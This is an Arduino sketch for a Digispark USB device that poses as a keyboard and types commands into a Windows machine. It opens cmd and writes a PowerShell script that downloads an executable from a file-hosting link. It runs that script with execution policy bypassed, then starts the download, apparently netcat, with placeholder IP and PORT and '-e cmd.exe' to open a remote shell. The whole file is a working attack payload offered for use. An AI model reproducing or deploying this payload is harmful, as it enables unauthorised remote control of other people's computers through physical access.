#include "DigiKeyboard.h"
/* Init function */
//script created by valkyrix.github.io
void setup()
{//turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
  pinMode(1, OUTPUT); //LED on Model A
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd / & mkdir win & cd /win & echo (wget 'https://1fichier.com/?dtc7uqmikl' -OutFile a.exe) > b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("START /MIN a.exe IP PORT -e cmd.exe -d & exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
}

/* Unused endless loop */
void loop() {}
